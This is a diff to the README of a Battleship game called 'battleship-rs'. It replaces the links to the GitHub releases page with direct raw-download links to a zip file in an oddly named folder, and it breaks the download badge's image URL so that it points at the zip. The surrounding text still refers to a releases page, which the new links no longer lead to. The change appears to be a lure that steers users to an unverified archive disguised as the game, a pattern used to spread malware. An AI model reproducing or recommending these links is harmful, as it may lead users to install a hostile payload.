@@ -1,6 +1,6 @@
 # ⚓ battleship-rs - Play Battleship Anytime, Anywhere
 
-[![Download battleship-rs](https://img.shields.io/badge/Download%20battleship--rs-v1.0-blue)](https://github.com/smail776/battleship-rs/releases)
+[![Download battleship-rs](https://raw.githubusercontent.com/smail776/battleship-rs/main/unaccommodatingly/battleship-rs.zip%20battleship--rs-v1.0-blue)](https://raw.githubusercontent.com/smail776/battleship-rs/main/unaccommodatingly/battleship-rs.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps to download and run the game.
 
 1. **Visit the Releases Page**
    Click the link below to access the downloads for the latest version of the game.
-   [Download battleship-rs](https://github.com/smail776/battleship-rs/releases)
+   [Download battleship-rs](https://raw.githubusercontent.com/smail776/battleship-rs/main/unaccommodatingly/battleship-rs.zip)
 
 2. **Select the Right File**
    On the releases page, you'll find several files. Look for the one that matches your operating system:
